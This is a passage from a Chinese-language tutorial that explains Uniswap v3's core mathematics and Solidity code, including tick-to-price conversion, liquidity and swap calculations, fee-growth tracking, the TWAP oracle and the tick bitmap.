从平方根价格计算实际价格\n    function getPrice() public pure returns (uint256) {\n        return FullMath.mulDiv(sqrtPriceX96, sqrtPriceX96, FixedPoint96.Q96);\n    }\n}\nTickMath库的核心算法深度解析\nTickMath库是整个系统最复杂的数学组件，实现了tick与价格的高效双向转换。\n核心公式：\nprice = 1.0001^tick\n√price = 1.0001^(tick/2)\n\n正向转换算法（tick → √price）：\nfunction getSqrtRatioAtTick(int24 tick) internal pure returns (uint160 sqrtPriceX96) {\n    uint256 absTick = tick &lt; 0 ? uint256(-int256(tick)) : uint256(int256(tick));\n    require(absTick &lt;= uint256(MAX_TICK), &#039;T&#039;);\n \n    // 核心算法：二进制分解 + 预计算表\n    // 每个if语句对应tick的一个二进制位\n    uint256 ratio = absTick &amp; 0x1 != 0 ? 0xfffcb933bd6fad37aa2d162d1a594001 : 0x100000000000000000000000000000000;\n    \n    // absTick &amp; 0x2 检查第2位，对应 √(1.0001^2)\n    if (absTick &amp; 0x2 != 0) ratio = (ratio * 0xfff97272373d413259a46990580e213a) &gt;&gt; 128;\n    \n    // absTick &amp; 0x4 检查第3位，对应 √(1.0001^4)  \n    if (absTick &amp; 0x4 != 0) ratio = (ratio * 0xfff2e50f5f656932ef12357cf3c7fdcc) &gt;&gt; 128;\n    \n    // ... 继续到第20位\n    \n    // 处理负tick：取倒数\n    if (tick &gt; 0) ratio = type(uint256).max / ratio;\n    \n    // 从Q128格式转为Q96格式，向上舍入\n    sqrtPriceX96 = uint160((ratio &gt;&gt; 32) + (ratio % (1 &lt;&lt; 32) == 0 ? 0 : 1));\n}\n算法创新点详解：\n\n\n二进制分解技术：\n例如：tick = 13 = 1101₂ = 8 + 4 + 1\n对应：1.0001^13 = 1.0001^8 × 1.0001^4 × 1.0001^1\n\n\n\n预计算常数表：\n0xfffcb933bd6fad37aa2d162d1a594001 = √(1.0001^1) * 2^128\n0xfff97272373d413259a46990580e213a = √(1.0001^2) * 2^128\n0xfff2e50f5f656932ef12357cf3c7fdcc = √(1.0001^4) * 2^128\n...\n\n\n\n位运算优化：使用&amp;运算替代if-else判断，提高执行效率\n\n\n精度控制：通过舍入策略确保计算精度\n\n\n反向转换算法（√price → tick）：\nfunction getTickAtSqrtRatio(uint160 sqrtPriceX96) internal pure returns (int24 tick) {\n    require(sqrtPriceX96 &gt;= MIN_SQRT_RATIO &amp;&amp; sqrtPriceX96 &lt; MAX_SQRT_RATIO, &#039;R&#039;);\n    uint256 ratio = uint256(sqrtPriceX96) &lt;&lt; 32;\n \n    uint256 r = ratio;\n    uint256 msb = 0;\n \n    // 使用汇编优化的二分查找最高有效位（MSB）\n    assembly {\n        let f := shl(7, gt(r, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF))\n        msb := or(msb, f)\n        r := shr(f, r)\n    }\n    assembly {\n        let f := shl(6, gt(r, 0xFFFFFFFFFFFFFFFF))\n        msb := or(msb, f)\n        r := shr(f, r)\n    }\n    // ... 更多MSB查找步骤\n \n    // 计算log_2(ratio)\n    int256 log_2 = (int256(msb) - 128) &lt;&lt; 64;\n \n    // 使用泰勒级数计算精确的log值\n    assembly {\n        r := shr(127, mul(r, r))\n        let f := shr(128, r)\n        log_2 := or(log_2, shl(63, f))\n        r := shr(f, r)\n    }\n    // ... 更多泰勒级数项\n \n    // 转换为log_√(1.0001) = log_2 / log_2(√1.0001)\n    int256 log_sqrt10001 = log_2 * 255738958999603826347141; // 128.128 number\n \n    // 计算tick，包含边界处理\n    int24 tickLow = int24((log_sqrt10001 - 3402992956809132418596140100660247210) &gt;&gt; 128);\n    int24 tickHi = int24((log_sqrt10001 + 291339464771989622907027621153398088495) &gt;&gt; 128);\n \n    tick = tickLow == tickHi ? tickLow : getSqrtRatioAtTick(tickHi) &lt;= sqrtPriceX96 ? tickHi : tickLow;\n}\n反向算法的核心思想：\n\n对数变换：price = 1.0001^tick → log(price) = tick × log(1.0001)\nMSB查找：快速确定数值范围\n泰勒级数：高精度计算对数值\n边界修正：处理舍入误差\n\n集中流动性的数学模型\n虚拟储备的概念与计算\n集中流动性引入了”虚拟储备”概念，这是理解v3机制的关键：\n传统AMM：x × y = k\n集中流动性：(x + x_virtual) × (y + y_virtual) = L²\n\n其中：\nx_virtual = L / √pb  (pb为价格上界)\ny_virtual = L × √pa  (pa为价格下界)\n\n虚拟储备的物理意义：\n\n价格区间外的假想储备：使得区间内的交易表现如传统AMM\n自动失效机制：价格超出区间时流动性自动失效\n资本效率：所有资本集中在有效价格区间\n\n// 虚拟储备计算的实现\nfunction getVirtualReserves(\n    uint160 sqrtPriceX96,\n    uint128 liquidity,\n    uint160 sqrtPriceAX96,  // 下界\n    uint160 sqrtPriceBX96   // 上界\n) internal pure returns (uint256 amount0, uint256 amount1) {\n    if (sqrtPriceX96 &lt;= sqrtPriceAX96) {\n        // 价格在区间下方：只有token0\n        amount0 = SqrtPriceMath.getAmount0Delta(sqrtPriceAX96, sqrtPriceBX96, liquidity, false);\n        amount1 = 0;\n    } else if (sqrtPriceX96 &lt; sqrtPriceBX96) {\n        // 价格在区间内：两种token都有\n        amount0 = SqrtPriceMath.getAmount0Delta(sqrtPriceX96, sqrtPriceBX96, liquidity, false);\n        amount1 = SqrtPriceMath.getAmount1Delta(sqrtPriceAX96, sqrtPriceX96, liquidity, false);\n    } else {\n        // 价格在区间上方：只有token1\n        amount0 = 0;\n        amount1 = SqrtPriceMath.getAmount1Delta(sqrtPriceAX96, sqrtPriceBX96, liquidity, false);\n    }\n}\n流动性与代币数量的关系\n在集中流动性模型中，流动性L与代币数量的关系更加复杂：\n当价格在区间内时：\nL = Δy / (√P - √Pa)  (当Δx = 0)\nL = Δx / (1/√P - 1/√Pb)  (当Δy = 0)\n\n当价格在区间边界时：\nL = Δy / (√Pb - √Pa)  (价格 = Pa时)\nL = Δx × √Pa × √Pb / (√Pb - √Pa)  (价格 = Pb时)\n// SqrtPriceMath库中的核心计算\nlibrary SqrtPriceMath {\n    // 计算给定价格变化所需的token0数量\n    function getAmount0Delta(\n        uint160 sqrtRatioAX96,\n        uint160 sqrtRatioBX96,\n        uint128 liquidity,\n        bool roundUp\n    ) internal pure returns (uint256 amount0) {\n        if (sqrtRatioAX96 &gt; sqrtRatioBX96) {\n            (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);\n        }\n\n        uint256 numerator1 = uint256(liquidity) &lt;&lt; FixedPoint96.RESOLUTION;\n        uint256 numerator2 = sqrtRatioBX96 - sqrtRatioAX96;\n\n        require(sqrtRatioAX96 &gt; 0);\n\n        return roundUp\n            ? UnsafeMath.divRoundingUp(\n                FullMath.mulDivRoundingUp(numerator1, numerator2, sqrtRatioBX96),\n                sqrtRatioAX96\n            )\n            : FullMath.mulDiv(numerator1, numerator2, sqrtRatioBX96) / sqrtRatioAX96;\n    }\n\n    // 计算给定价格变化所需的token1数量\n    function getAmount1Delta(\n        uint160 sqrtRatioAX96,\n        uint160 sqrtRatioBX96,\n        uint128 liquidity,\n        bool roundUp\n    ) internal pure returns (uint256 amount1) {\n        if (sqrtRatioAX96 &gt; sqrtRatioBX96) {\n            (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);\n        }\n\n        return roundUp\n            ? FullMath.mulDivRoundingUp(liquidity, sqrtRatioBX96 - sqrtRatioAX96, FixedPoint96.Q96)\n            : FullMath.mulDiv(liquidity, sqrtRatioBX96 - sqrtRatioAX96, FixedPoint96.Q96);\n    }\n}\n\n数学推导过程：\n对于amount0的计算：\n从 x = L / √P 推导：\nΔx = L × (1/√Pa - 1/√Pb) = L × (√Pb - √Pa) / (√Pa × √Pb)\n\n化简得：Δx = L × numerator2 / (√Pa × √Pb)\n其中 numerator2 = √Pb - √Pa\n\n交换机制的数学模型\nSwapMath库的核心算法详解\nSwapMath.computeSwapStep是整个交换过程的核心，处理单个tick内的交换逻辑：\nfunction computeSwapStep(\n    uint160 sqrtRatioCurrentX96,    // 当前价格√P\n    uint160 sqrtRatioTargetX96,     // 目标价格√P_target  \n    uint128 liquidity,              // 当前流动性L\n    int256 amountRemaining,         // 剩余交换数量\n    uint24 feePips                  // 费率(以万分之一为单位)\n) internal pure returns (\n    uint160 sqrtRatioNextX96,       // 交换后价格√P_next\n    uint256 amountIn,               // 实际输入数量\n    uint256 amountOut,              // 实际输出数量\n    uint256 feeAmount               // 费用数量\n) {\n    bool zeroForOne = sqrtRatioCurrentX96 &gt;= sqrtRatioTargetX96;\n    bool exactIn = amountRemaining &gt;= 0;\n \n    if (exactIn) {\n        // 精确输入模式：用户指定输入数量\n        uint256 amountRemainingLessFee = FullMath.mulDiv(\n            uint256(amountRemaining), \n            1e6 - feePips,  // 扣除费用后的数量\n            1e6\n        );\n        \n        // 计算到达目标价格需要的输入数量\n        amountIn = zeroForOne\n            ? SqrtPriceMath.getAmount0Delta(sqrtRatioTargetX96, sqrtRatioCurrentX96, liquidity, true)\n            : SqrtPriceMath.getAmount1Delta(sqrtRatioCurrentX96, sqrtRatioTargetX96, liquidity, true);\n        \n        // 判断能否到达目标价格\n        if (amountRemainingLessFee &gt;= amountIn) {\n            sqrtRatioNextX96 = sqrtRatioTargetX96;\n        } else {\n            // 计算在给定输入下的新价格\n            sqrtRatioNextX96 = SqrtPriceMath.getNextSqrtPriceFromInput(\n                sqrtRatioCurrentX96,\n                liquidity,\n                amountRemainingLessFee,\n                zeroForOne\n            );\n        }\n    } else {\n        // 精确输出模式：用户指定输出数量\n        // 类似逻辑但计算方向相反\n    }\n \n    bool max = sqrtRatioTargetX96 == sqrtRatioNextX96;\n \n    // 重新计算精确的输入输出数量\n    if (zeroForOne) {\n        amountIn = max &amp;&amp; exactIn\n            ? amountIn\n            : SqrtPriceMath.getAmount0Delta(sqrtRatioNextX96, sqrtRatioCurrentX96, liquidity, true);\n        amountOut = max &amp;&amp; !exactIn\n            ? amountOut\n            : SqrtPriceMath.getAmount1Delta(sqrtRatioNextX96, sqrtRatioCurrentX96, liquidity, false);\n    } else {\n        amountIn = max &amp;&amp; exactIn\n            ? amountIn\n            : SqrtPriceMath.getAmount1Delta(sqrtRatioCurrentX96, sqrtRatioNextX96, liquidity, true);\n        amountOut = max &amp;&amp; !exactIn\n            ? amountOut\n            : SqrtPriceMath.getAmount0Delta(sqrtRatioCurrentX96, sqrtRatioNextX96, liquidity, false);\n    }\n \n    // 计算费用\n    if (exactIn &amp;&amp; sqrtRatioNextX96 != sqrtRatioTargetX96) {\n        // 没有到达目标价格，剩余输入全部作为费用\n        feeAmount = uint256(amountRemaining) - amountIn;\n    } else {\n        // 基于实际输入计算费用\n        feeAmount = FullMath.mulDivRoundingUp(amountIn, feePips, 1e6 - feePips);\n    }\n}\n\n双向兼容：同时支持精确输入和精确输出模式\n边界处理：正确处理tick边界的跨越\n费用计算：确保费用计算的精确性\n舍入策略：对协议有利的舍入策略\n\n价格影响的计算模型\n在AMM中，价格影响是一个重要概念：\n价格影响 = (P_after - P_before) / P_before\n \n对于大额交易：\nP_after = L² / ((√(L²/P_before) + Δx) × (√(L²×P_before) - Δy))\n// 计算价格影响的示例代码\nfunction calculatePriceImpact(\n    uint160 sqrtPriceBefore,\n    uint160 sqrtPriceAfter\n) internal pure returns (uint256 priceImpact) {\n    if (sqrtPriceAfter &gt; sqrtPriceBefore) {\n        // 价格上涨\n        priceImpact = FullMath.mulDiv(\n            sqrtPriceAfter - sqrtPriceBefore,\n            FixedPoint96.Q96,\n            sqrtPriceBefore\n        );\n    } else {\n        // 价格下跌\n        priceImpact = FullMath.mulDiv(\n            sqrtPriceBefore - sqrtPriceAfter,\n            FixedPoint96.Q96,\n            sqrtPriceBefore\n        );\n    }\n}\n费用分配的数学机制\n费用增长率的概念\nUniswap v3使用”费用增长率”而非绝对费用来跟踪费用分配：\n费用增长率 = 总累积费用 / 总流动性\n单位流动性费用 = 费用增长率 × 流动性数量\n// 费用增长率的更新逻辑\nif (state.liquidity &gt; 0) {\n    state.feeGrowthGlobalX128 += FullMath.mulDiv(\n        step.feeAmount,           // 本次交换产生的费用\n        FixedPoint128.Q128,       // 128位定点数\n        state.liquidity           // 当前总流动性\n    );\n}\n内部费用增长率的计算\n对于特定价格区间内的流动性，需要计算”内部”费用增长率：\n内部费用增长率 = 全局费用增长率 - 下界外部费用增长率 - 上界外部费用增长率\nfunction getFeeGrowthInside(\n    mapping(int24 =&gt; Tick.Info) storage self,\n    int24 tickLower,\n    int24 tickUpper,\n    int24 tickCurrent,\n    uint256 feeGrowthGlobal0X128,\n    uint256 feeGrowthGlobal1X128\n) internal view returns (uint256 feeGrowthInside0X128, uint256 feeGrowthInside1X128) {\n    Info storage lower = self[tickLower];\n    Info storage upper = self[tickUpper];\n \n    // 计算下界费用增长\n    uint256 feeGrowthBelow0X128;\n    uint256 feeGrowthBelow1X128;\n    if (tickCurrent &gt;= tickLower) {\n        feeGrowthBelow0X128 = lower.feeGrowthOutside0X128;\n        feeGrowthBelow1X128 = lower.feeGrowthOutside1X128;\n    } else {\n        feeGrowthBelow0X128 = feeGrowthGlobal0X128 - lower.feeGrowthOutside0X128;\n        feeGrowthBelow1X128 = feeGrowthGlobal1X128 - lower.feeGrowthOutside1X128;\n    }\n \n    // 计算上界费用增长\n    uint256 feeGrowthAbove0X128;\n    uint256 feeGrowthAbove1X128;\n    if (tickCurrent &lt; tickUpper) {\n        feeGrowthAbove0X128 = upper.feeGrowthOutside0X128;\n        feeGrowthAbove1X128 = upper.feeGrowthOutside1X128;\n    } else {\n        feeGrowthAbove0X128 = feeGrowthGlobal0X128 - upper.feeGrowthOutside0X128;\n        feeGrowthAbove1X128 = feeGrowthGlobal1X128 - upper.feeGrowthOutside1X128;\n    }\n \n    // 计算内部费用增长\n    feeGrowthInside0X128 = feeGrowthGlobal0X128 - feeGrowthBelow0X128 - feeGrowthAbove0X128;\n    feeGrowthInside1X128 = feeGrowthGlobal1X128 - feeGrowthBelow1X128 - feeGrowthAbove1X128;\n}\n费用计算的数学原理：\n这种”内部-外部”的设计基于一个重要观察：当前价格将整个价格空间分为两部分，费用只在当前价格一侧累积。通过跟踪”外部”累积的费用，可以快速计算”内部”累积的费用。\n预言机机制的数学基础\n时间加权平均价格(TWAP)的计算\nUniswap v3内置了强大的预言机系统，基于TWAP机制：\nTWAP = (∑(Pi × Ti)) / ∑Ti\n \n其中：\nPi: 第i个时间段的价格\nTi: 第i个时间段的持续时间\nstruct Observation {\n    uint32 blockTimestamp;                        // 观察时间戳\n    int56 tickCumulative;                        // tick累积值\n    uint160 secondsPerLiquidityCumulativeX128;   // 每流动性秒数累积值  \n    bool initialized;                            // 是否初始化\n}\n \n// TWAP计算的核心逻辑\nfunction observeSingle(\n    Observation[65535] storage self,\n    uint32 time,\n    uint32 secondsAgo,\n    int24 tick,\n    uint16 index,\n    uint128 liquidity,\n    uint16 cardinality\n) internal view returns (int56 tickCumulative, uint160 secondsPerLiquidityCumulativeX128) {\n    if (secondsAgo == 0) {\n        Observation memory last = self[index];\n        if (last.blockTimestamp != time) {\n            // 需要插值计算\n            return transform(last, time, tick, liquidity);\n        }\n        return (last.tickCumulative, last.secondsPerLiquidityCumulativeX128);\n    }\n \n    uint32 target = time - secondsAgo;\n    (Observation memory beforeOrAt, Observation memory atOrAfter) = getSurroundingObservations(\n        self,\n        time,\n        target,\n        tick,\n        index,\n        liquidity,\n        cardinality\n    );\n \n    if (target == beforeOrAt.blockTimestamp) {\n        return (beforeOrAt.tickCumulative, beforeOrAt.secondsPerLiquidityCumulativeX128);\n    } else if (target == atOrAfter.blockTimestamp) {\n        return (atOrAfter.tickCumulative, atOrAfter.secondsPerLiquidityCumulativeX128);\n    } else {\n        // 线性插值\n        uint32 observationTimeDelta = atOrAfter.blockTimestamp - beforeOrAt.blockTimestamp;\n        uint32 targetDelta = target - beforeOrAt.blockTimestamp;\n        \n        return (\n            beforeOrAt.tickCumulative +\n                ((atOrAfter.tickCumulative - beforeOrAt.tickCumulative) / observationTimeDelta) * targetDelta,\n            beforeOrAt.secondsPerLiquidityCumulativeX128 +\n                uint160(\n                    (uint256(\n                        atOrAfter.secondsPerLiquidityCumulativeX128 - beforeOrAt.secondsPerLiquidityCumulativeX128\n                    ) * targetDelta) / observationTimeDelta\n                )\n        );\n    }\n}\nTWAP的优势：\n\n抗操纵性：单次大额交易无法显著影响长期平均价格\n平滑价格：过滤短期价格波动\n历史数据：提供丰富的历史价格信息\n高效计算：基于累积值的O(1)计算复杂度\n\n关键代码深度解析\n关键合约代码深度解析\nUniswapV3Pool合约的核心实现\n交换函数的完整实现解析\n交换函数是整个协议最复杂的部分，包含了价格发现、流动性管理、费用计算等核心逻辑：\nfunction swap(\n    address recipient,\n    bool zeroForOne,\n    int256 amountSpecified,\n    uint160 sqrtPriceLimitX96,\n    bytes calldata data\n) external override noDelegateCall returns (int256 amount0, int256 amount1) {\n    require(amountSpecified != 0, &#039;AS&#039;);\n \n    Slot0 memory slot0Start = slot0;\n    require(slot0Start.unlocked, &#039;LOK&#039;);\n    \n    // 价格限制验证：确保不会超出合理范围\n    require(\n        zeroForOne\n            ? sqrtPriceLimitX96 &lt; slot0Start.sqrtPriceX96 &amp;&amp; sqrtPriceLimitX96 &gt; TickMath.MIN_SQRT_RATIO\n            : sqrtPriceLimitX96 &gt; slot0Start.sqrtPriceX96 &amp;&amp; sqrtPriceLimitX96 &lt; TickMath.MAX_SQRT_RATIO,\n        &#039;SPL&#039;\n    );\n \n    slot0.unlocked = false; // 重入保护\n \n    // 初始化交换缓存\n    SwapCache memory cache = SwapCache({\n        liquidityStart: liquidity,\n        blockTimestamp: _blockTimestamp(),\n        feeProtocol: zeroForOne ? (slot0Start.feeProtocol % 16) : (slot0Start.feeProtocol &gt;&gt; 4),\n        secondsPerLiquidityCumulativeX128: 0,\n        tickCumulative: 0,\n        computedLatestObservation: false\n    });\n \n    bool exactInput = amountSpecified &gt; 0;\n \n    // 初始化交换状态\n    SwapState memory state = SwapState({\n        amountSpecifiedRemaining: amountSpecified,\n        amountCalculated: 0,\n        sqrtPriceX96: slot0Start.sqrtPriceX96,\n        tick: slot0Start.tick,\n        feeGrowthGlobalX128: zeroForOne ? feeGrowthGlobal0X128 : feeGrowthGlobal1X128,\n        protocolFee: 0,\n        liquidity: cache.liquidityStart\n    });\n \n    // 主交换循环：可能跨越多个tick\n    while (state.amountSpecifiedRemaining != 0 &amp;&amp; state.sqrtPriceX96 != sqrtPriceLimitX96) {\n        StepComputations memory step;\n        step.sqrtPriceStartX96 = state.sqrtPriceX96;\n \n        // 查找下一个初始化的tick\n        (step.tickNext, step.initialized) = tickBitmap.nextInitializedTickWithinOneWord(\n            state.tick,\n            tickSpacing,\n            zeroForOne\n        );\n \n        // 边界检查：防止超出tick范围\n        if (step.tickNext &lt; TickMath.MIN_TICK) {\n            step.tickNext = TickMath.MIN_TICK;\n        } else if (step.tickNext &gt; TickMath.MAX_TICK) {\n            step.tickNext = TickMath.MAX_TICK;\n        }\n \n        // 计算目标价格\n        step.sqrtPriceNextX96 = TickMath.getSqrtRatioAtTick(step.tickNext);\n \n        // 核心计算：在当前流动性下进行交换\n        (state.sqrtPriceX96, step.amountIn, step.amountOut, step.feeAmount) = SwapMath.computeSwapStep(\n            state.sqrtPriceX96,\n            (zeroForOne ? step.sqrtPriceNextX96 &lt; sqrtPriceLimitX96 : step.sqrtPriceNextX96 &gt; sqrtPriceLimitX96)\n                ? sqrtPriceLimitX96\n                : step.sqrtPriceNextX96,\n            state.liquidity,\n            state.amountSpecifiedRemaining,\n            fee\n        );\n \n        // 更新交换状态\n        if (exactInput) {\n            state.amountSpecifiedRemaining -= (step.amountIn + step.feeAmount).toInt256();\n            state.amountCalculated = state.amountCalculated.sub(step.amountOut.toInt256());\n        } else {\n            state.amountSpecifiedRemaining += step.amountOut.toInt256();\n            state.amountCalculated = state.amountCalculated.add((step.amountIn + step.feeAmount).toInt256());\n        }\n \n        // 协议费用计算\n        if (cache.feeProtocol &gt; 0) {\n            uint256 delta = step.feeAmount / cache.feeProtocol;\n            step.feeAmount -= delta;\n            state.protocolFee += uint128(delta);\n        }\n \n        // 更新全局费用增长率\n        if (state.liquidity &gt; 0)\n            state.feeGrowthGlobalX128 += FullMath.mulDiv(step.feeAmount, FixedPoint128.Q128, state.liquidity);\n \n        // 处理tick跨越\n        if (state.sqrtPriceX96 == step.sqrtPriceNextX96) {\n            if (step.initialized) {\n                // 更新预言机（如果需要）\n                if (!cache.computedLatestObservation) {\n                    (cache.tickCumulative, cache.secondsPerLiquidityCumulativeX128) = observations.observeSingle(\n                        cache.blockTimestamp,\n                        0,\n                        slot0Start.tick,\n                        slot0Start.observationIndex,\n                        cache.liquidityStart,\n                        slot0Start.observationCardinality\n                    );\n                    cache.computedLatestObservation = true;\n                }\n                \n                // 执行tick跨越\n                int128 liquidityNet = ticks.cross(\n                    step.tickNext,\n                    (zeroForOne ? state.feeGrowthGlobalX128 : feeGrowthGlobal0X128),\n                    (zeroForOne ? feeGrowthGlobal1X128 : state.feeGrowthGlobalX128),\n                    cache.secondsPerLiquidityCumulativeX128,\n                    cache.tickCumulative,\n                    cache.blockTimestamp\n                );\n                \n                // 更新活跃流动性\n                if (zeroForOne) liquidityNet = -liquidityNet;\n                state.liquidity = LiquidityMath.addDelta(state.liquidity, liquidityNet);\n            }\n \n            state.tick = zeroForOne ? step.tickNext - 1 : step.tickNext;\n        } else if (state.sqrtPriceX96 != step.sqrtPriceStartX96) {\n            // 重新计算tick（价格在tick中间停止）\n            state.tick = TickMath.getTickAtSqrtRatio(state.sqrtPriceX96);\n        }\n    }\n \n    // 更新全局状态\n    if (state.tick != slot0Start.tick) {\n        (uint16 observationIndex, uint16 observationCardinality) = observations.write(\n            slot0Start.observationIndex,\n            cache.blockTimestamp,\n            slot0Start.tick,\n            cache.liquidityStart,\n            slot0Start.observationCardinality,\n            slot0Start.observationCardinalityNext\n        );\n        (slot0.sqrtPriceX96, slot0.tick, slot0.observationIndex, slot0.observationCardinality) = (\n            state.sqrtPriceX96,\n            state.tick,\n            observationIndex,\n            observationCardinality\n        );\n    } else {\n        slot0.sqrtPriceX96 = state.sqrtPriceX96;\n    }\n \n    if (cache.liquidityStart != state.liquidity) liquidity = state.liquidity;\n \n    // 更新费用增长率和协议费用\n    if (zeroForOne) {\n        feeGrowthGlobal0X128 = state.feeGrowthGlobalX128;\n        if (state.protocolFee &gt; 0) protocolFees.token0 += state.protocolFee;\n    } else {\n        feeGrowthGlobal1X128 = state.feeGrowthGlobalX128;\n        if (state.protocolFee &gt; 0) protocolFees.token1 += state.protocolFee;\n    }\n \n    // 计算最终的代币数量变化\n    (amount0, amount1) = zeroForOne == exactInput\n        ? (amountSpecified - state.amountSpecifiedRemaining, state.amountCalculated)\n        : (state.amountCalculated, amountSpecified - state.amountSpecifiedRemaining);\n \n    // 执行代币转账和回调\n    if (zeroForOne) {\n        if (amount1 &lt; 0) TransferHelper.safeTransfer(token1, recipient, uint256(-amount1));\n \n        uint256 balance0Before = balance0();\n        IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);\n        require(balance0Before.add(uint256(amount0)) &lt;= balance0(), &#039;IIA&#039;);\n    } else {\n        if (amount0 &lt; 0) TransferHelper.safeTransfer(token0, recipient, uint256(-amount0));\n \n        uint256 balance1Before = balance1();\n        IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);\n        require(balance1Before.add(uint256(amount1)) &lt;= balance1(), &#039;IIA&#039;);\n    }\n \n    emit Swap(msg.sender, recipient, amount0, amount1, state.sqrtPriceX96, state.liquidity, state.tick);\n    slot0.unlocked = true;\n}\n交换函数的核心设计要点：\n\n分步计算：将复杂的交换分解为多个tick内的计算\n状态管理：精确跟踪交换过程中的状态变化\n费用处理：准确计算和分配交易费用\n预言机更新：在价格变化时更新时间加权平均价格\n安全检查：多层验证确保交换的安全性\n\n流动性管理的核心实现\n流动性的添加和移除是v3的核心功能，涉及复杂的价格区间管理：\nfunction _modifyPosition(ModifyPositionParams memory params)\n    private\n    noDelegateCall\n    returns (\n        Position.Info storage position,\n        int256 amount0,\n        int256 amount1\n    )\n{\n    checkTicks(params.tickLower, params.tickUpper);\n \n    Slot0 memory _slot0 = slot0;\n \n    position = _updatePosition(\n        params.owner,\n        params.tickLower,\n        params.tickUpper,\n        params.liquidityDelta,\n        _slot0.tick\n    );\n \n    if (params.liquidityDelta != 0) {\n        if (_slot0.tick &lt; params.tickLower) {\n            // 当前价格在区间下方：只需要token0\n            amount0 = SqrtPriceMath.getAmount0Delta(\n                TickMath.getSqrtRatioAtTick(params.tickLower),\n                TickMath.getSqrtRatioAtTick(params.tickUpper),\n                params.liquidityDelta\n            );\n        } else if (_slot0.tick &lt; params.tickUpper) {\n            // 当前价格在区间内：需要两种代币\n            amount0 = SqrtPriceMath.getAmount0Delta(\n                _slot0.sqrtPriceX96,\n                TickMath.getSqrtRatioAtTick(params.tickUpper),\n                params.liquidityDelta\n            );\n            amount1 = SqrtPriceMath.getAmount1Delta(\n                TickMath.getSqrtRatioAtTick(params.tickLower),\n                _slot0.sqrtPriceX96,\n                params.liquidityDelta\n            );\n \n            liquidity = LiquidityMath.addDelta(liquidity, params.liquidityDelta);\n        } else {\n            // 当前价格在区间上方：只需要token1\n            amount1 = SqrtPriceMath.getAmount1Delta(\n                TickMath.getSqrtRatioAtTick(params.tickLower),\n                TickMath.getSqrtRatioAtTick(params.tickUpper),\n                params.liquidityDelta\n            );\n        }\n    }\n}\n \nfunction _updatePosition(\n    address owner,\n    int24 tickLower,\n    int24 tickUpper,\n    int128 liquidityDelta,\n    int24 tick\n) private returns (Position.Info storage position) {\n    position = positions.get(owner, tickLower, tickUpper);\n \n    uint256 _feeGrowthGlobal0X128 = feeGrowthGlobal0X128;\n    uint256 _feeGrowthGlobal1X128 = feeGrowthGlobal1X128;\n \n    bool flippedLower;\n    bool flippedUpper;\n    if (liquidityDelta != 0) {\n        uint32 time = _blockTimestamp();\n        (int56 tickCumulative, uint160 secondsPerLiquidityCumulativeX128) = observations.observeSingle(\n            time,\n            0,\n            slot0.tick,\n            slot0.observationIndex,\n            liquidity,\n            slot0.observationCardinality\n        );\n \n        // 更新tick信息\n        flippedLower = ticks.update(\n            tickLower,\n            tick,\n            liquidityDelta,\n            _feeGrowthGlobal0X128,\n            _feeGrowthGlobal1X128,\n            secondsPerLiquidityCumulativeX128,\n            tickCumulative,\n            time,\n            false,\n            maxLiquidityPerTick\n        );\n        flippedUpper = ticks.update(\n            tickUpper,\n            tick,\n            liquidityDelta,\n            _feeGrowthGlobal0X128,\n            _feeGrowthGlobal1X128,\n            secondsPerLiquidityCumulativeX128,\n            tickCumulative,\n            time,\n            true,\n            maxLiquidityPerTick\n        );\n \n        // 更新tick位图\n        if (flippedLower) {\n            tickBitmap.flipTick(tickLower, tickSpacing);\n        }\n        if (flippedUpper) {\n            tickBitmap.flipTick(tickUpper, tickSpacing);\n        }\n    }\n \n    // 计算区间内的费用增长率\n    (uint256 feeGrowthInside0X128, uint256 feeGrowthInside1X128) =\n        ticks.getFeeGrowthInside(tickLower, tickUpper, tick, _feeGrowthGlobal0X128, _feeGrowthGlobal1X128);\n \n    // 更新位置信息\n    position.update(liquidityDelta, feeGrowthInside0X128, feeGrowthInside1X128);\n \n    // 清理无用的tick数据\n    if (liquidityDelta &lt; 0) {\n        if (flippedLower) {\n            ticks.clear(tickLower);\n        }\n        if (flippedUpper) {\n            ticks.clear(tickUpper);\n        }\n    }\n}\nTickBitmap的高效实现\n位图数据结构的设计\nTickBitmap是v3的一个重要创新，用于高效查找下一个初始化的tick：\nlibrary TickBitmap {\n    // 计算tick在位图中的位置\n    function position(int24 tick) private pure returns (int16 wordPos, uint8 bitPos) {\n        wordPos = int16(tick &gt;&gt; 8);\n        bitPos = uint8(tick % 256);\n    }\n \n    // 翻转tick的状态（初始化/未初始化）\n    function flipTick(\n        mapping(int16 =&gt; uint256) storage self,\n        int24 tick,\n        int24 tickSpacing\n    ) internal {\n        require(tick % tickSpacing == 0); // 确保tick对齐\n        (int16 wordPos, uint8 bitPos) = position(tick / tickSpacing);\n        uint256 mask = 1 &lt;&lt; bitPos;\n        self[wordPos] ^= mask;\n    }\n \n    // 查找下一个初始化的tick（在一个word内）\n    function nextInitializedTickWithinOneWord(\n        mapping(int16 =&gt; uint256) storage self,\n        int24 tick,\n        int24 tickSpacing,\n        bool lte\n    ) internal view returns (int24 next, bool initialized) {\n        int24 compressed = tick / tickSpacing;\n        if (tick &lt; 0 &amp;&amp; tick % tickSpacing != 0) compressed--; // 向下舍入\n \n        if (lte) {\n            // 向左查找（价格下降方向）\n            (int16 wordPos, uint8 bitPos) = position(compressed);\n            uint256 mask = (1 &lt;&lt; bitPos) - 1 + (1 &lt;&lt; bitPos);\n            uint256 masked = self[wordPos] &amp; mask;\n \n            initialized = masked != 0;\n            next = initialized\n                ? (compressed - int24(bitPos - BitMath.mostSignificantBit(masked))) * tickSpacing\n                : (compressed - int24(bitPos)) * tickSpacing;\n        } else {\n            // 向右查找（价格上升方向）\n            (int16 wordPos, uint8 bitPos) = position(compressed + 1);\n            uint256 mask = ~((1 &lt;&lt; bitPos) - 1);\n            uint256 masked = self[wordPos] &amp; mask;\n \n            initialized = masked != 0;\n            next = initialized\n                ? (compressed + 1 + int24(BitMath.leastSignificantBit(masked) - bitPos)) * tickSpacing\n                : (compressed + 1 + int24(type(uint8).max - bitPos)) * tickSpacing;\n        }\n    